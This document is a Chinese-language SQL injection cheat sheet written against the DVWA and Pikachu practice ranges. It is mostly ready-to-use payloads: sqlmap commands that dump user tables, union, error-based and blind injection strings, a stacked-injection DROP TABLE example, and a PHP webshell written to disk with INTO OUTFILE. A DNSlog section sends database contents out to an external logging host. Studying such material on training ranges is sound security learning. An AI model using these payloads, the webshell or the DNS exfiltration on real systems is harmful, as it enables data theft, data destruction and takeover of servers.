# dvwa SQL注入

sqlmap

[是否有漏洞]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low"

[获取数据库]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" --dbs

[获取指定数据库表]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" -D dvwa --tables

[获取指定数据库表列]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" -D dvwa -T users --columns
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" -D dvwa -T users --dump

# pikachu靶场

## 信息收集

判断是否有漏洞
```
' -- 有报错代表有漏洞
1' and 1=1#
1' and 1=2#
```

判断一共查询的列数
```
-- 通过对结果列排序判断，一直到尝试到报错
1' order by 1#
1' order by 2#

-- 通过union判断结果有几列
' union select 1,2 from dual#
```

查询数据库的版本、数据库名字等信息
```
' union select version(),DATABASE() from dual#
version() -- 当前数据库的版本
database() -- 当前数据库的名字
user() --当前 MySQL 会话的用户，如 root@192.168.1.100
current_user()  
@@hostname -- 服务器的主机名
@@port  -- MySQL 服务器监听的端口号
@@socket -- MySQL 服务器使用的 socket 文件名（用于 Unix/Linux 系统）
@@datadir -- MySQL 数据目录的路径
@@basedir -- MySQL 安装的基目录路径
@@sql_mode -- 当前会话的 SQL 模式
@@max_connections -- 服务器允许的最大连接数
@@time_zone -- 当前的时间区域设置
@@version_comment -- MySQL 服务器的版本注释（通常是分发信息）
@@version_compile_os -- MySQL 服务器编译时的操作系统名称
```
可以用过`show global variables`来查看mysql的变量。


查询数据库及表
```
-- 查询有哪些数据库
1' union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#
-- 查询某个数据库有哪些表
1' union select table_name,table_schema from information_schema.tables where table_schema='pikachu'#
1' union select 'pikachu',group_concat(table_name) from information_schema.tables where table_schema='pikachu'#
-- 查询某个表有哪些列
1' union select 'member',group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA ='pikachu' and TABLE_NAME ='member'#
-- 查询表中一些列的数据
1' union select username,pw from member#
1' union select id,CONCAT_WS('#',username,pw,sex,phonenum,address,email) from member#
```

## 字符型注入

**正常**

输入`vince`可以查询到输入。

**注入**

输入`1' or 1=1#`可以查询到全部的数据。

**union select**

查询`users`表中的数据
```
-- 只查询users表
1' and 1=1 union select username,password from users#
' union select username,password from users#
-- 查询原始表和users表
1' or 1=1 union select username,password from users#
```

## 数字型注入

```
1 or 1=1#
```

## 搜索型

```
%' or 1=1#
```

## xx型

```
') or 1=1#
```

## http header注入(盲注)

初次登录使用admin/123456进行登录，页面显示ip、user agent、http accept、连接的tcp端口信息。
再次登录会携带Cookie信息，如：
```
Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=onh6bt5vjei6ad6io85qnvtjm5
```
通过修改Cookie来进行注入，下面的例子可以获取数据库版本号。
```
ant[uname]=admin' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
```
页面显示`XPATH syntax error:'~5.7.26~'`,成功获取的数据库的版本。

类似的通过`SELECT extractvalue(1, concat('#', (SELECT @@version)));`也可以进行sql注入。

## insert/update 注入

> insert 注册的时候修改用户名信息
```
1' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) or '
```

> update 修改用户信息的时候加入下面信息
```
1' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) or '
```

## delete

先添加一下留言板信息，在删除的时候抓包，修改id
```
-- 对下面的语句进行url编码
 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- 最后提交的url
sqli_del.php?id=56%20and%20updatexml%281%2cconcat%280x7e%2c%28SELECT%20%40%40version%29%2c0x7e%29%2c1%29
```

## 宽字节注入

> 宽字节注入是一种特殊的SQL注入攻击，通常发生在某些系统没有正确处理字符编码的情况下，特别是在使用GBK等双字节编码的系统中。攻击者可以利用这种编码的特点将SQL注入代码变成有效的SQL语句，绕过输入过滤。

**原理**

在**GBK编码**中，中文字符是由两个字节组成的，其中第一个字节的范围在0x81到0xFE之间，第二个字节的范围在0x40到0xFE之间。如果用户输入一个单字节的特殊字符，如%，并且这个字符没有被正确过滤，那么攻击者可以通过添加一个字节来组成一个合法的GBK字符，从而完成注入。

简单说，系统防护的手段是：

> 将原来的特殊字符如：`'`转义为了`\'`，导致无法注入成功。

**pikachu宽字节注入**

抓包后修改请求体内的参数，在`'`（%27）前加上`%df`。这样后台在处理的时候后变成`%df%5c%27`，其中`%df%5c`两个字节被组成一个汉字，`%27`还原成`'`，完成sql注入。
```
name=%df%27+or+1%3D1%23&submit=%E6%9F%A5%E8%AF%A2
```

## 其他注入手法

### 加密注入

> 在提交到后台的数据是加密的，注入可以考虑先解密

### 堆叠注入

> 堆叠注入（Stacked Injection），通过在现有的SQL语句后面添加额外的SQL语句，从而执行多个SQL操作。这种技术的前提是目标数据库允许同时执行多条SQL 语句。

例子：

假设原始SQL查询如下：

```
SELECT * FROM users WHERE username = 'user1';
```

如果系统允许堆叠SQL语句，可以在输入user1的地方插入以下内容：
```
user1'; DROP TABLE users; --
```

**堆叠注入的危害很大，需要重点关注**

### 二次注入

> 二次注入（Second-Order Injection）是一种高级的SQL注入攻击方式。与传统的SQL
注入（一次注入）不同，二次注入通常发生第一次注入将恶意代码存储在数据库中，而这段恶意代码不会立即执行，而是在之后被应用程序通过其他SQL查询或操作再次调用时执行。

例子：

假设原始SQL查询如下：

```
-- 将一个用户为admin的用户保存在数据库中，但是admin一般是管理员，不会插入进去
insert into user(username,password) values('admin','123');
```

**一次注入：**

将用户名改为`admin'#`,这是用户名被保存在了数据库中。

**二次注入：**

使用`admin'#`登录系统，执行修改密码的操作，这是update变成了如下的样子：
```
update user set password='xxx' where username='admin'#
-- 这样对导致管理管的密码被修改，完成注入。
```



## 爆破实战

### 爆数据库版本

```
1' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
1' and updatexml(1,concat("~",(SELECT @@version),"~),1) #
```

### 爆当前数据库用户

```
1' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) #
```

### 爆数据库

```
1' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
```

### 爆表

```
-- 这个是多行的
1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='pikachu'),0x7e),1) #
-- 这个是单行的
1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='pikachu' limit 0,1),0x7e),1) #
```
> 注意修改数据库名和查询的行数

### 爆字段
```
1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1) #
```

### 爆数据
```
1' and updatexml(1,concat(0x7e,(SELECT password from users limit 0,1),0x7e),1) #
```

## 盲注

由于页面不显示查询错误信息，无法判断是否有注入点的情况。

### boolean型盲注

观察响应结果判断数据库名字的长度

```
vince' and length(database())=7#
```

再尝试获取数据库的每个字母

```
vince' and substr(database(),1,1)='p'#
```

### 时间型盲注

基于时间响应的盲注，无需数据回显。

观察响应时间判断是否有注入点
```
a'
a' or sleep(5)#
```

获取数据库长度
```
a' or if(length(database())<8,sleep(5),0)#
a' or if(length(database())=7,sleep(5),0)#
```

再尝试获取数据库的每个字母
```
a' or if(substr(database(),1,1)='a',sleep(5),0)#
a' or if(substr(database(),1,1)='p',sleep(5),0)#
```

## 写入木马程序

前提

- 知道php服务器的目录
  - 收集站点敏感目录，比如phpinfo.php探针文件是否可以访问到
  - 站点网址输入一些不存在的网址或者加一些非法参数数据，让网站报错，看错误信息中是否存在路径信息
  - 指纹信息收集
    - nginx，默认站点目录:/usr/share/nginx/html，配置文件路径:/etc/nginx/nginx.config
    - apache默认站点目录:/var/www/html
  - 通过站点其他漏洞来获取配置信息、真实物理路信息，比如如果发现远程命令执行漏洞(后面会讲到各种漏洞)，针对php的站点，直接执其行一个phpinfo()函数，可以看到phpinfo.php所展示的各种信息等等
  - 其他思路，反正就是不断的尝试。

- 数据库开启了`secure_file_priv`配置

```
' union select 1,"<?php @eval($_POST['qwert']);?>" into outfile "C:\\software\\phpstudy_pro\\WWW\\test.php"#
```

注入成功后可以使用浏览器访问`test.php`，之后可以通过[蚁剑](https://github.com/AntSwordProject/antSword)连接。

## DNSlog注入

通过mysql的`load_file`函数携带数据去访问远程的服务器，远程服务器将访问日志记录下来达到获取数据库信息的目的。

前提数据库要开启`secure_file_priv`配置，并且可以访问外网。

开启mysql配置。
```
[mysqld]
secure_file_priv=""
```

注入方式
```
and (select load_file(concat('//',database(),"远程服务器xxx.ceye.io")))#
```

可用的公网服务器：
- http://ceye.io  知道创宇
- http://www.dnslog.cn
- http://admin.dnslog.link

